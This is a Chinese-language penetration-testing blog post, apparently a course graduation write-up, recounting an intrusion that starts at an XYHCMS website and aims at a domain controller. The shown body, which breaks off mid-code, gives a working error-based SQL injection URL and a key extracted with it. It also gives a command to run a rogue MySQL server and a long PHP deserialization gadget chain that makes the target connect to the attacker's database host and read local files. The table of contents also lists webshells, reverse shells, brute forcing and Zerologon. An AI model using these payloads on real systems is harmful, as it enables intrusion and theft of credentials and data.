  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&is_video=false&description=scaner从外网到拿下域控"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=scaner从外网到拿下域控&body=Check out this article: https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&name=scaner从外网到拿下域控&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&t=scaner从外网到拿下域控"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.</span> <span class="toc-text">scaner从外网到拿下域控</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞整理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BAxyhcms%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">在本地搭建xyhcms进行测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.1.</span> <span class="toc-text">前台SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.3.2.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8FMySQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.3.</span> <span class="toc-text">恶意MySQL服务器读取数据库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EMySQL%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="toc-number">3.3.4.</span> <span class="toc-text">反序列化漏洞MySQL日志写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BA%BF%E4%B8%8A%E7%8E%AF%E5%A2%83"><span class="toc-number">3.3.5.</span> <span class="toc-text">尝试线上环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%AE%9D%E5%A1%94%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95"><span class="toc-number">3.4.</span> <span class="toc-text">本地搭建宝塔环境测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.4.1.</span> <span class="toc-text">代码审计</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E6%89%93%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">外部打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%8B%BFkey"><span class="toc-number">4.1.</span> <span class="toc-text">SQL注入拿key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">反序列化漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8FMySQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6-1"><span class="toc-number">4.3.</span> <span class="toc-text">恶意MySQL服务器读取数据库文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%8F%92%E5%85%A5%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="toc-number">4.4.</span> <span class="toc-text">堆叠插入管理员用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="toc-number">4.5.</span> <span class="toc-text">文件包含getshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E7%BB%95%E8%BF%87%E5%AE%9D%E5%A1%94"><span class="toc-number">5.0.1.</span> <span class="toc-text">蚁剑流量绕过宝塔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-FPM%E7%BB%95%E8%BF%87disable"><span class="toc-number">5.0.2.</span> <span class="toc-text">PHP-FPM绕过disable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.0.3.</span> <span class="toc-text">msf反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%B8%BAroot"><span class="toc-number">5.0.4.</span> <span class="toc-text">提权为root</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">6.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">6.0.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra%E7%88%86%E7%A0%B4sqlserver"><span class="toc-number">6.0.2.</span> <span class="toc-text">hydra爆破sqlserver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#natvicat%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5mssql"><span class="toc-number">6.0.3.</span> <span class="toc-text">natvicat客户端连接mssql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">6.0.4.</span> <span class="toc-text">信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2020-1472%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.</span> <span class="toc-text">cve-2020-1472拿下域控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Impacket-secretsdump-%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E5%93%88%E5%B8%8C"><span class="toc-number">6.1.1.</span> <span class="toc-text">Impacket secretsdump 获取域控哈希</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-smbexec-%E7%99%BB%E5%BD%95%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">通过 smbexec 登录域控制器</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        scaner从外网到拿下域控
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Garck3h</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-05-22T02:38:38.000Z" class="dt-published" itemprop="datePublished">2022-05-22</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/">实战记录</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E5%9F%9F%E6%8E%A7/" rel="tag">域控</a>, <a class="p-category" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" rel="tag">红蓝对抗</a>, <a class="p-category" href="/tags/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9/" rel="tag">红队打点</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="scaner从外网到拿下域控"><a href="#scaner从外网到拿下域控" class="headerlink" title="scaner从外网到拿下域控"></a>scaner从外网到拿下域控</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是个人moonsec考核的出师文章</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>打开了站点很明显发现了这是个xyhcms，先使用御剑扫一波目录，未发现敏感信息。</p>
<h2 id="漏洞整理"><a href="#漏洞整理" class="headerlink" title="漏洞整理"></a>漏洞整理</h2><p>从网上查找该cms的一些相关的漏洞，找到了一个前台SQL注入和一些后台getshell,以及反序列化漏洞。</p>
<p>前台SQL注入：<a target="_blank" rel="noopener" href="http://althims.com/2020/02/03/xyhcms-3-6/">http://althims.com/2020/02/03/xyhcms-3-6/</a></p>
<p>后台getshell：<a target="_blank" rel="noopener" href="https://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/">https://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</a></p>
<p>反序列化：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232823">https://www.anquanke.com/post/id/232823</a></p>
<h2 id="在本地搭建xyhcms进行测试"><a href="#在本地搭建xyhcms进行测试" class="headerlink" title="在本地搭建xyhcms进行测试"></a>在本地搭建xyhcms进行测试</h2><p>搭建使用的是phpstudy集成工具</p>
<h3 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xyh.com/index.php/Api/Lt/alist</span></span><br><span class="line">?orderby[<span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="title function_ invoke__">char</span>(<span class="number">126</span>),(select <span class="title function_ invoke__">database</span>()),<span class="title function_ invoke__">char</span>(<span class="number">126</span>)),<span class="number">1</span>);]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="eFiDj6ZnDA-I7w_D_zmx58BYFtwNVMRLVWolNtJ3uYw.png" alt="image"></p>
<p>通过日志查看结果：成功执行user()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xyh.com/App/Runtime/Logs/Api/22_05_14.log</span></span><br></pre></td></tr></table></figure>
<p><img src="2AhTENzE3OvrZY3JEuQOID-q9LWDkoRzgIrqLeBQ3go.png" alt="image"></p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>查看前面看到的反序列化文章，这个反序列化漏洞，事先需要拿到key，在本地导出了SQL文件能查询到这个key，说明该key是存在于数据库中的，可以结合前面的SQL注入拿到。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xyh.com/index.php/Api/Lt/alist?orderby[updatexml(1,concat(char(126),(select username from xyh_admin limit 0,1),char(126)),1);]=1</span></span><br></pre></td></tr></table></figure>
<p>然后通过查看日志拿到key：iqQmhxkAU</p>
<p>注册一个会员</p>
<p><img src="0434TErovOItsmPmfHF-sxPxo-gWTuZ-6ula6ewoftY.png" alt="image"></p>
<p>登录之后抓包</p>
<p><img src="vqMPR-A3881I2hhT0u2Zg9yxN5SL47Q67Mfdx5-xCxM.png" alt="image"></p>
<p>伪造nickname的值可以操作数据库</p>
<h3 id="恶意MySQL服务器读取数据库文件"><a href="#恶意MySQL服务器读取数据库文件" class="headerlink" title="恶意MySQL服务器读取数据库文件"></a>恶意MySQL服务器读取数据库文件</h3><p>让系统报错，拿到绝对路径：</p>
<p>xyh.com&#x2F;App&#x2F;Api&#x2F;Conf&#x2F;config.php</p>
<p>绝对路径：</p>
<p><strong>C:\phpstudy_pro\WWW\xyh.com\App\Api\Conf\config.php</strong></p>
<p><img src="KaMc7sJAAqq0hupbC3YG5-qMTqkJyWdGpjGxIFPvVVc.png" alt="image"></p>
<p>数据库配置文件的默认路径：xyhcms\\App\\Common\\Conf\\db.php</p>
<p>构建的地址为：C:\\phpstudy_pro\\WWW\\xyh.com\\App\\Common\\Conf\\db.php</p>
<p>启动MySQL服务：</p>
<p><code>python rogue_mysql_server.py</code></p>
<p>设置POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">        PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;dsn&quot;</span>    =&gt; <span class="string">&quot;mysql:host=192.168.8.133;dbname=xyhcms;port=3306&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;123456&quot;</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">\Think\Db\Driver\Mysql</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;luoke&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;xyh_admin_log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;id=0;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">\Think\Model</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">\Think\Session\Driver\Memcache</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Common</span>\<span class="title class_">Lib</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SysCrypt</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$crypt_key</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypt_key</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span> -&gt; crypt_key = <span class="variable">$crypt_key</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">php_encrypt</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">srand</span>((<span class="keyword">double</span>)<span class="title function_ invoke__">microtime</span>() * <span class="number">1000000</span>);</span><br><span class="line">	   <span class="variable">$encrypt_key</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">32000</span>));</span><br><span class="line">	   <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypt_key</span>) ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>].(<span class="variable">$txt</span>[<span class="variable">$i</span>]^<span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>++]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">__key</span>(<span class="variable">$tmp</span>,<span class="variable">$this</span> -&gt; crypt_key));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">php_decrypt</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$txt</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">__key</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$txt</span>),<span class="variable">$this</span> -&gt; crypt_key);</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$md5</span> = <span class="variable">$txt</span>[<span class="variable">$i</span>];</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[++<span class="variable">$i</span>] ^ <span class="variable">$md5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__key</span>(<span class="params"><span class="variable">$txt</span>,<span class="variable">$encrypt_key</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$encrypt_key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$encrypt_key</span>);</span><br><span class="line">	   <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypt_key</span>) ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span> -&gt; crypt_key = <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_cookie</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class="line">	<span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$sc</span> = <span class="keyword">new</span> <span class="title class_">\Common\Lib\SysCrypt</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$value</span> = <span class="variable">$sc</span>-&gt;<span class="title function_ invoke__">php_decrypt</span>(<span class="variable">$name</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params"><span class="variable">$args</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class="line">	<span class="variable">$value</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$args</span>);</span><br><span class="line">	<span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$sc</span> = <span class="keyword">new</span> <span class="title 